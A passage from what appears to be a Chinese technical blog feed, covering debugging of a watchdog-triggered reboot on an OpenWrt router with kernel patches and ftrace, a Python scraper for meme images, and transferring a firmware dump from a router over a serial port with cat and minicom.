MODULE_AUTHOR(&quot;QUALCOMM&quot;);
</code></pre>
<h3 id="src-Makefile"><a href="#src-Makefile" class="headerlink" title="src/Makefile"></a>src/Makefile</h3><pre><code class="Makefile"># This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version
# 2 of the License, or (at your option) any later version.

obj-m := dead.o

ifeq ($(MAKING_MODULES),1)

-include $(TOPDIR)/Rules.make
endif
</code></pre>
<h3 id="src-Kconfig"><a href="#src-Kconfig" class="headerlink" title="src/Kconfig"></a>src/Kconfig</h3><pre><code class="yml">config DEAD
    tristate &quot;This is a Module_DEAD&quot;
    default y
    help
        This is a dead module, for debugging kernel crash.
        If unsure, say N.
</code></pre>
<h2 id="打印watchdog-ping相关log"><a href="#打印watchdog-ping相关log" class="headerlink" title="打印watchdog ping相关log"></a>打印watchdog ping相关log</h2><p>编辑以下文件，在watchdog执行ping操作时打印log</p>
<p>build_dir/target-arm_cortex-a7_uClibc-1.0.14_eabi/linux-ipq806x/linux-3.14.77/drivers/watchdog/qcom-wdt.c</p>
<pre><code class="c">static int qcom_wdt_ping(struct watchdog_device *wdd)
{
    struct qcom_wdt *wdt = to_qcom_wdt(wdd);

    printk(&quot;********************qcom-wdt-ping1*****************\n&quot;);
    writel(1, wdt-&gt;wdt_reset);
    printk(&quot;********************qcom-wdt-ping2*****************\n&quot;);
    return 0;
}
</code></pre>
<p>以上<code>printk</code>部分就是打印的log。据此可以生成kernel patch如下：</p>
<blockquote>
<p>待修改文件：linux-3.14.77/drivers/watchdog/qcom-wdt.c<br>路径：target/linux/ipq806x/patches_dni-3.14<br>patch：0101-print-watch-ping-log.patch</p>
</blockquote>
<pre><code class="patch">--- linux-3.14.77.orig/drivers/watchdog/qcom-wdt.c 2019-11-01 10:0:18.332348721 +0800
+++ linux-3.14.77/drivers/watchdog/qcom-wdt.c 2019-11-01 09:39:58.689575974 +0800
@@ -253,7 +253,9 @@
 {
     struct qcom_wdt *wdt = to_qcom_wdt(wdd);

+    printk(&quot;********************qcom-wdt-ping1*****************\n&quot;);
     writel(1, wdt-&gt;wdt_reset);
+    printk(&quot;********************qcom-wdt-ping2*****************\n&quot;);
     return 0;
 }
</code></pre>
<h2 id="打开DTS-debug"><a href="#打开DTS-debug" class="headerlink" title="打开DTS debug"></a>打开DTS debug</h2><p>编辑dts（Device Tree Source）的配置文件，使能<code>init_debug</code></p>
<blockquote>
<p>待修改文件：linux-3.14.77/arch/arm/boot/dts/qcom-ipq40xx-ap.dj04.1.dtsi<br>路径：target/linux/ipq806x/patches_dni-3.14<br>patch：0102-add-init_debug=4-in-dts.patch</p>
</blockquote>
<pre><code class="patch">--- linux-3.14.77.orig/arch/arm/boot/dts/qcom-ipq4xx-ap.dk04.1.dtsi 2019-11-01 16:07:53.063327477 +0800
+++ linux-3.14.77/arch/arm/boot/dts/qcom-ipq4xx-ap.dk04.1.dtsi 2019-11-01 14:05:33.923495413 +0800
@@ -50,7 +50,7 @@
+       };
+
+       chosen {
+-              bootargs-append = &quot; clk_ignore_unused user_debug=0xff&quot;;
++              bootargs-append = &quot; clk_ignore_unused user_debug=0xff init_debug=4&quot;;
+       };
+
+ };
</code></pre>
<p><code>init_debug</code>用于打开调试log，上面的patch对应修改的系统文件是<code>/proc/cmdline</code></p>
<pre><code class="sh">$ cat /proc/cmdline
 rootwait clk_ignore_unused user_debug=0xff init_debug=4
</code></pre>
<h2 id="修改kernel-size-amp-rootfs-size"><a href="#修改kernel-size-amp-rootfs-size" class="headerlink" title="修改kernel_size &amp; rootfs_size"></a>修改kernel_size &amp; rootfs_size</h2><p>使能大量debug信息会导致kernel size增大，所以需要修正kernel size.</p>
<h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><p>kernel的大小可以从以下文件获取。</p>
<pre><code class="sh">$ ls -l bin/ipq806x/openwrt-ipq806x-qcom-ipq40xx-ap.dkxx-fit-uImage.itb
-rw-r--r-- 1 guangtao.wu guangtao.wu 4364244 Oct 31 16:06 bin/ipq806x/openwrt-ipq806x-qcom-ipq40xx-ap.dkxx-fit-uImage.itb
</code></pre>
<p>由于flash需要128k对齐，所以<code>kernel size</code>需要通过以上文件大小<code>4364244</code>除以128k再取整后重新计算</p>
<pre><code class="c">4364244 / ( 128 * 1024 ) = 33.2965

# kernel size
34 * 128 * 1024 = 4456448 = 0x440000

# rootfs size
0x2800000 - 0x440000 = 0x23c0000
</code></pre>
<h3 id="修改dni-home-config-defconfig-orbi"><a href="#修改dni-home-config-defconfig-orbi" class="headerlink" title="修改dni_home config/defconfig-orbi"></a>修改dni_home config/defconfig-orbi</h3><pre><code class="txt">CONFIG_DGC_FW_KERNEL_SIZE=&quot;4456448&quot;
CONFIG_DGC_FW_ROOTFS_SIZE=&quot;37486592&quot;
CONFIG_DGC_FW_KERNEL_SIZE_CC=&quot;4456448&quot;
CONFIG_DGC_FW_ROOTFS_SIZE_CC=&quot;37486592&quot;
</code></pre>
<h3 id="修改kernel-patch"><a href="#修改kernel-patch" class="headerlink" title="修改kernel patch"></a>修改kernel patch</h3><p>patch: kernel/patches_dni/0012-fix-issue-after-disable-usb-rootfs-checksum-error.patch</p>
<pre><code class="patch">      { 0x0a600000, 0x02800000, &quot;firmware&quot; },
 -    { 0x0a600000, 0x003c0000, &quot;kernel&quot; },
 -    { 0x0a9c0000, 0x02440000, &quot;rootfs&quot; },
-+    { 0x0a600000, 0x003c0000, &quot;kernel&quot; },
-+    { 0x0a9c0000, 0x02440000, &quot;rootfs&quot; },
++    { 0x0a600000, 0x00440000, &quot;kernel&quot; },
++    { 0x0aa40000, 0x023c0000, &quot;rootfs&quot; },
      { 0x0ce00000, 0x03200000, &quot;reserved&quot; },
</code></pre>
<h2 id="watchdog相关指令"><a href="#watchdog相关指令" class="headerlink" title="watchdog相关指令"></a>watchdog相关指令</h2><h3 id="禁用watchdog的硬件重启功能"><a href="#禁用watchdog的硬件重启功能" class="headerlink" title="禁用watchdog的硬件重启功能"></a>禁用watchdog的硬件重启功能</h3><pre><code class="sh">devmem 0x0B017008 w 0x0
</code></pre>
<p>说明：禁用watchdog的硬件重启功能可以防止kernel crash后自动重启，配合ftrace及其它调试信息能方便分析问题。</p>
<h3 id="watchdog软件控制指令"><a href="#watchdog软件控制指令" class="headerlink" title="watchdog软件控制指令"></a>watchdog软件控制指令</h3><pre><code class="sh"># To query watchdog status
ubus call system watchdog

# To stop watchdog
ubus call system watchdog &#39;{&quot;stop&quot;: true}&#39;

# To start watchdog
ubus call system watchdog &#39;{&quot;stop&quot;: false}&#39;

# To configure watchdog timeout as 20 seconds (default is 30 seconds)
ubus call system watchdog &#39;{&quot;timeout&quot;: 20}&#39;
</code></pre>
<p>说明：在没有禁用watchdog硬件功能时，如果使用<code>ubus</code>停止<code>watchdog</code>，系统会在设定的超时时间(默认30s)后自动重启。</p>
<h2 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h2><p>启用<code>ftrace</code>调试功能除了需要修改配置文件外，还要对<code>/sys/kernel/debug/tracing/</code>目录的文件进行相关修改才能生效。下面是在测试trial FW时用到的测试脚本，用于获取必要的调试信息。</p>
<pre><code class="sh">#!/bin/sh
# use for watchdog cause reboot issue

#********************************************#
# watchdog settings
#********************************************#
# disable the APCS_KPSS watchdog
devmem 0x0B017008 w 0x0

# check watchdog status
ubus call system watchdog

# other related commands
#   ubus call system watchdog &#39;{&quot;stop&quot;: true}&#39;
#   ubus call system watchdog &#39;{&quot;stop&quot;: false}&#39;
#   ubus call system watchdog &#39;{&quot;timeout&quot;: 20}&#39;

#********************************************#
# enable ftrace
#********************************************#
# To enable function tracing during run time
echo 0 &gt; /sys/kernel/debug/tracing/tracing_on
echo function &gt; /sys/kernel/debug/tracing/current_tracer
echo 1 &gt; /sys/kernel/debug/tracing/tracing_on

# To enable specific events to be traced
echo tlet_entry &gt;&gt; /sys/kernel/debug/tracing/set_event
echo tlet_exit &gt;&gt; /sys/kernel/debug/tracing/set_event
echo irq_handler_entry &gt;&gt; /sys/kernel/debug/tracing/set_event
echo irq_handler_exit &gt;&gt; /sys/kernel/debug/tracing/set_event
echo softirq_entry &gt;&gt; /sys/kernel/debug/tracing/set_event
echo softirq_exit &gt;&gt; /sys/kernel/debug/tracing/set_event
echo timer_expire_entry &gt;&gt; /sys/kernel/debug/tracing/set_event
echo timer_expire_exit &gt;&gt; /sys/kernel/debug/tracing/set_event
echo sched_switch &gt;&gt; /sys/kernel/debug/tracing/set_event

# To Dump the FTrace to the console in case of oops
echo 1 &gt; /proc/sys/kernel/ftrace_dump_on_oops

# To increase the size of Ftrace buffer per CPU
echo 2048 &gt; /sys/kernel/debug/tracing/buffer_size_kb

# To enable tracing of signals
echo SyS_reboot:dump &gt; /sys/kernel/debug/tracing/set_ftrace_filter
echo 1 &gt; /sys/kernel/debug/tracing/events/signal/enable
echo 1 &gt; /sys/kernel/debug/tracing/tracing_on
sysctl -w kernel.ftrace_dump_on_oops=1


#********************************************#
# loop to cat memory info and process info
#********************************************#
while true
do
    free
    ps ww
    cat /proc/meminfo
    cat /proc/slabinfo
    ubus call system watchdog
    sleep 300
done
</code></pre>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.kernel.org/doc/Documentation/trace/ftrace.txt" target="_blank" rel="noopener">ftrace - Function Tracer</a></li>
</ul>
<h2 id="2020-01-14-更新"><a href="#2020-01-14-更新" class="headerlink" title="2020.01.14 更新"></a>2020.01.14 更新</h2><p>在一个新项目中又出现了watchdog bite导致系统重启的问题，而且重现概率很高，所以又开始了新一轮的debug</p>
<h3 id="重现步骤"><a href="#重现步骤" class="headerlink" title="重现步骤"></a>重现步骤</h3><p>根据SQA提供的重现步骤，经过多次测试后简化如下，按此步骤可以100%重现问题</p>
<ol>
<li>重置路由器</li>
<li>重新配置路由器</li>
<li>使能block site功能，添加关键词，比如yam</li>
<li>使能Email功能，添加gmail邮箱，当用户访问blocked site时自动发送mail</li>
<li>访问block site</li>
</ol>
<p>除了第一次重现时需要执行<code>step1~4</code>外，之后重新烧录FW都只需执行第5步</p>
<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><h4 id="enable-lockup"><a href="#enable-lockup" class="headerlink" title="enable lockup"></a>enable lockup</h4><p>在情况并不明朗的情况下，仅仅根据以下两行log根本无法判断问题所在</p>
<pre><code class="log">Causing a watchdog bite!
Configuring Watchdog Timer
</code></pre>
<p>所以先假设可能是某些进程死锁导致的，启用内核的<code>lockup debugging</code>功能，启用方式与上述一致</p>
<p>启用后，除了boot阶段打印了大量log外，watchdog问题出现时并无任何lockup log出现，所以进入下一步</p>
<h3 id="print-watchdog-ping-log"><a href="#print-watchdog-ping-log" class="headerlink" title="print watchdog ping log"></a>print watchdog ping log</h3><p>watchdog的工作流程大致是：procd定时发送一个ping包给内核，内核的watchdog驱动接收到ping后喂给硬件watchdog</p>
<p>为了确认是user space的问题还是kernel space的问题，我们需要print两个space的ping信息，相关patch也和上述的一致，只不过在procd中需要另外添加一个patch</p>
<pre><code class="patch">+--- procd.old/watchdog.c    2020-01-13 16:03:08.671893208 +0800
++++ procd/watchdog.c    2020-01-13 16:06:32.966771640 +0800
+@@ -32,9 +33,26 @@
+ static int wdt_fd = -1;
+ static int wdt_frequency = 5;
+
++void __nprintf(const char *fmt, ...);
++/* use this &#39;__nprintf&#39; to print message */
++void __nprintf(const char *fmt, ...)
++{
++    va_list ap;
++    static FILE *filp;
++
++    if ((filp == NULL) &amp;&amp; (filp = fopen(&quot;/dev/console&quot;, &quot;a&quot;)) == NULL)
++            return;
++
++    va_start(ap, fmt);
++    vfprintf(filp, fmt, ap);
++    fputs(&quot;\n&quot;, filp);
++    va_end(ap);
++}
++
+ void watchdog_ping(void)
+ {
+     DEBUG(4, &quot;Ping\n&quot;);
++    __nprintf(&quot;[%s:%d] Ping\n&quot;, __func__, __LINE__);
+     if (wdt_fd &gt;= 0 &amp;&amp; write(wdt_fd, &quot;X&quot;, 1) &lt; 0)
+         ERROR(&quot;WDT failed to write: %s\n&quot;, strerror(errno));
+ }
</code></pre>
<p>再次重现可以看到以下console log</p>
<pre><code class="log">124809:[Mon Jan 13 18:12:48.754 2020] [watchdog_ping:54] Ping
124810:[Mon Jan 13 18:12:48.754 2020] *************qcom-wdt-ping1*******************
124811:[Mon Jan 13 18:12:48.754 2020] **************qcom-wdt-ping2*******************
124814:[Mon Jan 13 18:12:52.811 2020] [watchdog_ping:54] Ping
124815:[Mon Jan 13 18:12:53.766 2020] *************qcom-wdt-ping1*******************
124816:[Mon Jan 13 18:12:53.766 2020] **************qcom-wdt-ping2*******************
124820:[Mon Jan 13 18:12:55.021 2020] cat: can&#39;t open &#39;/tmp/gl_task_name&#39;: No such file or directory
124821:[Mon Jan 13 18:12:55.021 2020] cat: can&#39;t open &#39;/var/log/block-site-messages&#39;: No such file or directory
124880:[Mon Jan 13 18:13:53.391 2020] Causing a watchdog bite!
</code></pre>
<p>可以看出，在刷新block site页面后，console不再打印watchdog log，可以判断是user space出了问题，也就是<code>procd</code>。</p>
<p>在刷新block site页面时，内核模块会发送信号告知<code>procd</code>（这个是组长告知的，重要信息！），结合log中显示的两个不存在的文件，可以找到相应的执行脚本<code>send_email_alert</code>。procd在接收信号后会通过<code>system</code>函数调用脚本，进而通过ssmtp发送邮件。</p>
<p>此时为了确定脚本执行过程中发生了什么异常，我加了许多log，然后定位到<code>ssmtp</code>执行时间过长，为此，到了接下来的最后一步。</p>
<h4 id="strace-ssmtp"><a href="#strace-ssmtp" class="headerlink" title="strace ssmtp"></a>strace ssmtp</h4><p>修改脚本<code>send_email_alert</code>，在执行ssmtp前添加<code>strace</code>，追踪代码执行过程。</p>
<pre><code class="log">[Tue Jan 14 16:08:44.046 2020] socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 5
[Tue Jan 14 16:08:44.046 2020] connect(5, {sa_family=AF_INET, sin_port=htons(25), sin_addr=inet_addr(&quot;139.175.54.240&quot;)}, 16
</code></pre>
<p>可以发现进程卡死在connect部分，最终分析出访问gmail时连接超时，导致procd hang住，无法正常发送watchdog ping，进而引发reboot。</p>
<h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>在启用block site功能和send_email_alert功能后，访问一个被路由器block的网站，此时内核模块会向procd进程发送一个信号，procd接收信号后会后通过<code>system</code>函数执行一个发送邮件的指令，但是当发送的对象是gmail时，由于中国网络无法直接访问google，导致长时间无法连接，最终导致procd hang住，并且无法发送watchdog ping，最终导致watchdog等待超时进而重启设备。</p>
<p>简言之：<strong>邮件发送超时导致procd hang住</strong></p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>最简单的方法是，在调用<code>system</code>函数时，让指令在后台执行↓</p>
<pre><code class="patch">-   system(&quot;/etc/email/send_email_alert&quot;);
+   system(&quot;/etc/email/send_email_alert &amp;&quot;);
</code></pre>
<p>当然，或许有其它更好的解决方案，比如不要让内核模块直接发信号给procd，毕竟procd作为pid为1的特殊进程，不适合处理太多琐碎的事务。可以让内核模块给email相关的daemon进程单独发信号，但改动会多很多。就目前而言，使用后台执行指令的方法是简单而有效的。</p>
<p>OK，这个问题总算完结了，撒花✿✿ヽ(°▽°)ノ✿~</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>watchdog是用来监控系统异常的，当其重启设备时，绝大情况源于进程死锁</li>
<li>对于watchdog相关问题，可以先确认是用户空间的问题还是内核空间的问题，便于针对性debug</li>
<li>有时候，某些看起来与问题毫无关联的log可能就是最关键的突破点</li>
<li>重现步骤的准确性能大大提高问题调试的效率</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openwrt </tag>
            
            <tag> ftrace </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python网络爬虫7 - 爬取表情包]]></title>
      <url>https://www.litreily.top/2019/10/09/fabiaoqing/</url>
      <content type="html"><![CDATA[<p>为了逗女朋友开心，想找一堆表情包，那么作为一名程序员，自然是会想到用程序来完成这个事情，而Python爬虫就是一个非常好的方法。</p>
<p>我先找到了一个专门发布表情包的网站，就叫做<a href="https://www.fabiaoqing.com/" target="_blank" rel="noopener">发表情</a>网，可以通过搜索关键词得到大量相关的表情包，下面对这个网站的爬取进行详细介绍。</p>
<p><img src="/assets/emotion/fabiaoqing.png" alt="fabiaoqing"></p>
<h2 id="分析站点"><a href="#分析站点" class="headerlink" title="分析站点"></a>分析站点</h2><p>为了不引起不适，我选择搜索“你好”，出来的结果是这样的</p>
<p><img src="/assets/emotion/hello.png" alt="hello"></p>
<p>可以看到共有<code>688</code>个相关的<strong>表情</strong>，右侧的<strong>表情包</strong>是分组形式的，不是我的爬取对象。我们只关注表情，在网页底部可以看到分页信息：</p>
<p><img src="/assets/emotion/page.png" alt="page"></p>
<p>切换分页到第４页后，可以看到网址的编号情况如下：</p>
<p><img src="/assets/emotion/hello-2.png" alt="hello page 2"></p>
<p>网址是<a href="https://www.fabiaoqing.com/search/search/keyword/你好/type/bq/page/4.html" target="_blank" rel="noopener">https://www.fabiaoqing.com/search/search/keyword/你好/type/bq/page/4.html</a>，据此就可以分析出表情的分页格式</p>
<ol>
<li><code>keyword</code> 后接关键词，此处为“你好”</li>
<li><code>type</code> 后接类型，此处为&quot;bq&quot;,对应<strong>表情</strong></li>
<li><code>page</code> 后接页码，此处为&quot;4.html&quot;，对应第４页</li>
</ol>
<p>到此就确定了关键词和分页信息的整合方式，根据这个可以按顺序获取指定关键词的所有分页。那么接下来的问题是如何解析每个分页中的图片信息，下面请看：</p>
<p><img src="/assets/emotion/hello-3.png" alt="hello page 3"></p>
<p>每个图片都在一个<code>div</code>标签内，使用<code>chrome</code>的调试工具可以获取到图片元素的<code>xpath</code>路径，然后稍作修改就可以匹配到当前页的所有图片</p>
<pre><code class="python">imgs = page.xpath(&#39;//div[@class=&quot;searchbqppdiv tagbqppdiv&quot;]//img/@data-original&#39;)
</code></pre>
<p>好了，到此，网站的分页已经每页的图片获取方式都知道了，下面开始完成代码的编写↓</p>
<h2 id="爬虫的代码实现"><a href="#爬虫的代码实现" class="headerlink" title="爬虫的代码实现"></a>爬虫的代码实现</h2><ol>
<li>获取指定关键词的所有分页</li>
<li>从分页中获取所有表情图片的链接</li>
<li>下载图片并存储到本地</li>
</ol>
<h3 id="get-imgs"><a href="#get-imgs" class="headerlink" title="get_imgs"></a>get_imgs</h3><p>首先对单个关键词，实现分页和图片链接的获取</p>
<pre><code class="python">def get_imgs(keyword):
    &#39;&#39;&#39;爬取某一个关键词相关的所有表情包
    Args:
        keyword: 表情包关键词
    &#39;&#39;&#39;
    page_index = 0
    img_cnts = 0
    save_dir = get_path(keyword)
    while True:
        page_index = page_index + 1
        # https://fabiaoqing.com/search/search/keyword/抱抱/type/bq/page/1.html
        url = &#39;{}{}/type/bq/page/{}.html&#39;.format(base_url, keyword, page_index)
        response = requests.get(url, headers=headers).content
        page = html.fromstring(response)
        imgs = page.xpath(
            &#39;//div[@class=&quot;searchbqppdiv tagbqppdiv&quot;]//img/@data-original&#39;)

        print(&#39;爬取 &quot;{}&quot; 相关表情包第 {} 页:&#39;.format(keyword, page_index))
        img_cnts = download_imgs(imgs, img_cnts, save_dir)

        if page_index == 1:
            page_num = int(
                page.xpath(&#39;//*[@id=&quot;mobilepage&quot;]/text()&#39;)[0].split()[-1])

        if page_index == page_num:
            break

    return img_cnts, save_dir
</code></pre>
<p>思路很简单，就是从１不断增加分页页码<code>page_index</code>，然后使用<code>lxml</code>中的<code>xpath</code>解析网页得到图片链接，最后使用下面介绍的<code>download_imgs</code>函数下载图片。那么什么时候停止获取呢？就是比较首页获取的总分页数<code>page_num</code>和当前分页数<code>page_index</code>是否一致，如果一致说明已经到最后一页。</p>
<p>函数中的<code>get_path</code>是个获取本地存储链接的函数，<code>base_url</code>和<code>headers</code>是两个全局变量</p>
<pre><code class="python">base_url = &#39;https://fabiaoqing.com/search/search/keyword/&#39;
headers = {
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36&#39;
}


def get_path(keyword):
    &#39;&#39;&#39;生成指定关键词对应的表情包存储路径&#39;&#39;&#39;
    home_path = os.path.expanduser(&#39;~&#39;)
    path = os.path.join(home_path, &#39;Pictures/python/表情包/&#39; + keyword)
    if not os.path.isdir(path):
        os.makedirs(path)

    return os.path.realpath(path)
</code></pre>
<h3 id="download-imgs"><a href="#download-imgs" class="headerlink" title="download_imgs"></a>download_imgs</h3><pre><code class="python">def download_imgs(img_urls, starti, save_dir):
    &#39;&#39;&#39;下载单个页面内所有图片
    Args:
        img_urls: 关键词相关表情包某一分页的所有图片链接
        starti: 当前页面首个图片命名id
        save_dir: 图片存储路径
    &#39;&#39;&#39;
    fid = starti
    for img in img_urls:
        print(&#39;\t&#39; + img)
        fid = fid + 1
        file_name = &#39;{}.{}&#39;.format(fid, os.path.basename(img).split(&#39;.&#39;)[-1])
        save_path = os.path.join(save_dir, file_name)

        try:
            with open(save_path, &#39;wb&#39;) as f:
                f.write(requests.get(img, headers=headers, timeout=20).content)
        except requests.exceptions.ConnectionError as ce:
            print(ce.strerror())
        except requests.exceptions.MissingSchema:
            print(img + &#39; missing schema&#39;)
        except requests.exceptions.ReadTimeout:
            print(&#39;get {} timeout, skip this item.&#39;.format(img))
        finally:
            pass

    return fid
</code></pre>
<p>别看代码这么长，下载图片的关键就两行，和以往下载图片的方式大同小异，不再赘述。</p>
<pre><code class="python">with open(save_path, &#39;wb&#39;) as f:
    f.write(requests.get(img, headers=headers, timeout=20).content)
</code></pre>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>主函数也比较简单，从命令行参数中获取所有关键词，逐个对关键词进行对应的表情爬取并统计爬取到的表情数。</p>
<pre><code class="python">def main():
    if len(sys.argv) &lt; 2:
        usage()
        sys.exit(0)

    print(&#39;============================================&#39;)
    for keyword in sys.argv[1:]:
        print(&#39;开始爬取关键词为 &quot;{}&quot; 的表情包:&#39;.format(keyword))
        count, save_dir = get_imgs(keyword)
        print(&#39;共爬取 &quot;{}&quot; 表情包 {} 个&#39;.format(keyword, count))
        print(&#39;文件存储于&quot;{}&quot;&#39;.format(save_dir))
    print(&#39;\n爬取完成！&#39;)
    print(&#39;============================================&#39;)
</code></pre>
<p>由于我们的目的是根据输入的关键词参数获取相关的表情，代码完成后的使用方式是这样的：</p>
<pre><code class="bash">python fabiaoqing_spider.py keyword1 keyword2 ...
</code></pre>
<p>所以<code>usage</code>函数是这样的，可以同时爬取多个关键词</p>
<pre><code class="python">def usage():
    print(&#39;Usage:\n\t&#39; + os.path.basename(sys.argv[0]) +
          &#39; [key1] [key2] [key3] ...\n&#39;)
</code></pre>
<h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><pre><code class="bash">python fabiaoqing_spider.py 你好 抱抱 亲亲
</code></pre>
<p><img src="/assets/emotion/test1.png" alt="test1"></p>
<p><img src="/assets/emotion/test2.png" alt="test2"></p>
<p><img src="/assets/emotion/test3.png" alt="test3"></p>
<p>上面是截取的部分爬取过程，下面是<strong>亲亲</strong>表情包的爬取结果</p>
<p><img src="/assets/emotion/test4.png" alt="test4"></p>
<p>代码已托管至<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">Github capturer</a>项目，欢迎交流。</p>
<p>好啦，最后祝大家撩妹成功！</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[嵌入式设备在无法使用网络和USB的情况下如何进行文件传输]]></title>
      <url>https://www.litreily.top/2019/09/12/minicom/</url>
      <content type="html"><![CDATA[<h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>ST 测试时出现一个问题，路由器（采用<a href="https://openwrt.org" target="_blank" rel="noopener">Openwrt</a>系统）的console无法正常显示shell提示符，正常情况下是</p>
<pre><code class="bash">root@DeviceName:/#
</code></pre>
<p>这样的，出问题时是下面这样的，用户名不见了，设备名变成了none.</p>
<pre><code class="bash">@(none):/#
</code></pre>
<a id="more"></a>
<p>不仅如此，执行ls发现根目录很多文件都不存在了。最初我和组长认为可能是存储固件的<code>nand flash</code>出了问题，所以想把固件<code>dump</code>出来换到另一块板子上，所以先使用<code>nanddump</code>指令把固件保存到<code>fw.img</code>文件中：</p>
<pre><code class="bash">nanddump /dev/mtd8 -f /tmp/fw.img
</code></pre>
<p>接着想要通过<code>tftp</code>传到外面，但是失败了，<code>ifconfig</code>查看网络信息发现没有任何IP，<code>ps</code>查看进程信息发现绝大部分进程都没有启动，很显然，缺失的文件过多，板子无法正常使用网络传输了。那么USB呢，对了我用的这款路由器带有USB功能，插上以后没有任何反应，不过也是意料之中，相关的USB检测进程木有起来呗。</p>
<p>那么现在问题来了，在无法使用网络和USB的情况下，如何把数据从板子copy到PC呢？下面介绍两种方法。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="uboot-tftp文件传输"><a href="#uboot-tftp文件传输" class="headerlink" title="uboot tftp文件传输"></a>uboot tftp文件传输</h3><p>我最初想到的方法就是uboot，通过uboot把数据dump到内存，然后使用uboot中的tftp把数据传出来，相关指令如下：</p>
<pre><code class="bash">nand read &lt;ram_addr&gt; &lt;flash_addr&gt; &lt;size&gt;
tftpput &lt;ram_addr&gt; &lt;size&gt; &lt;file_name&gt;

# example
nand read 0x84000000 0x1480000 0x1860000
tftpput 0x84000000 0x1860000 Fireware.img
</code></pre>
<p>这里涉及到两个指令<code>nand read</code>和<code>tftpput</code>，<code>nand flash</code>的block size是128K，所以flash地址以及size都设置为128K的整数倍</p>
<ul>
<li><code>ram_addr</code> - 内存地址，也是平常fw_recovery存放固件的地址</li>
<li><code>flash_addr</code> - 存放固件的flash地址，需要查看代码相关配置文件查询</li>
<li><code>size</code> - 读取数据的长度，大概设置为大于固件大小的值</li>
</ul>
<p>在uboot启动时会将自身IP设为<code>192.168.1.1</code>，所以只需把PC端的IP设为静态IP <code>192.168.1.10</code>即可传输。然而还有一个问题，出现问题的设备uboot并不包含<code>tftpput</code>指令，这是<code>uboot</code>版本问题，这就尴尬了。。。显然此路不通。</p>
<h3 id="串口传输"><a href="#串口传输" class="headerlink" title="串口传输"></a>串口传输</h3><p>重点来了，在我黔驴技穷的情况下，我组长很平静的说出了<strong>串口传输</strong>的方法，绝对的骚操作!!!</p>
<p>乍一听，<strong>串口传输</strong>可能会觉得很一般，不就是通过串口把数据传出来么，当年单片机开发用的可溜了好吧。咱不急，慢慢看</p>
<p>这个方法在<code>linux</code>系统很方便，<code>windows</code>系统没研究过。我使用的是<code>ubuntu 18.04</code>， 进入正题，使用<code>tmux</code>打开两个窗口，如果没有<code>tmux</code>或者<code>screen</code>则打开两个终端窗口也是一样的。</p>
<ul>
<li>发送窗口</li>
</ul>
<p>在super模式下，将文件<code>fw.img</code>通过串口打印出来</p>
<pre><code class="bash">litreily@litreily-Aspire-4750:~ &gt;&gt; sudo su
root# cat &gt; /dev/ttyUSB0
cat fw.img
</code></pre>
<p>这个窗口通过cat指令向串口发送指令<code>cat fw.img</code>,那么板子中的文件<code>fw.img</code>数据就会开始传输。</p>
<ul>
<li>接收窗口</li>
</ul>
<pre><code class="bash">sudo cat /dev/ttyUSB0 &gt; ~/fw.img
</code></pre>
<p><img src="/assets/shell/serial_transfer.png" alt="serial transfer"></p>
<p>接收窗口通过cat串口接收输入数据并重定向至本地文件<code>～/fw.img</code>。注意，执行接收窗口的指令，再执行发送窗口的指令，这样就保证了接收数据的完整性。</p>
<p>是不是很骚气，这也充分展示了<code>linux</code>系统下<strong>一切皆是文件</strong>的厉害之处，通过简单的<code>cat</code>指令就可以玩转串口数据。</p>
<h3 id="扩展补充：minicom"><a href="#扩展补充：minicom" class="headerlink" title="扩展补充：minicom"></a>扩展补充：minicom</h3><p>针对串口传输，推荐个<code>linux</code>上极为好用的串口终端<code>minicom</code>，类似于<code>windows</code>系统中的<code>tera term</code>。</p>
<pre><code class="bash">sudo apt install minicom
</code></pre>
<p>安装后，在串口连接状态下，通过以下指令找到串口设备<code>/dev/ttyUSB0</code></p>
<pre><code class="bash">$ ls -l /dev/ttyUSB*
crw-rw---- 1 root dialout 188, 0 9月  12 22:42 /dev/ttyUSB0
</code></pre>
<p>然后启动<code>minicom</code>，首次启动需要配置些参数</p>
<pre><code class="bash">sudo minicom -s

+-----[configuration]------+
| Filenames and paths      |
| File transfer protocols  |
| Serial port setup        |
| Modem and dialing        |
| Screen and keyboard      |
| Save setup as dfl        |
| Save setup as..          |
| Exit                     |
| Exit from Minicom        |
+--------------------------+
</code></pre>
<p>选择<code>Serial port setup</code>，然后根据下面的提示设置<code>Serial Device</code>为上面查找到的<code>/dev/ttyUSB0</code>，将Hardware Flow Control设置为no</p>
<pre><code class="bash">+-----------------------------------------------------------------------+
| A -    Serial Device      : /dev/ttyUSB0                              |
| B - Lockfile Location     : /var/lock                                 |
| C -   Callin Program      :                                           |
| D -  Callout Program      :                                           |
| E -    Bps/Par/Bits       : 115200 8N1                                |
| F - Hardware Flow Control : No                                        |
| G - Software Flow Control : No                                        |
|                                                                       |
|    Change which setting?                                              |
+-----------------------------------------------------------------------+
</code></pre>
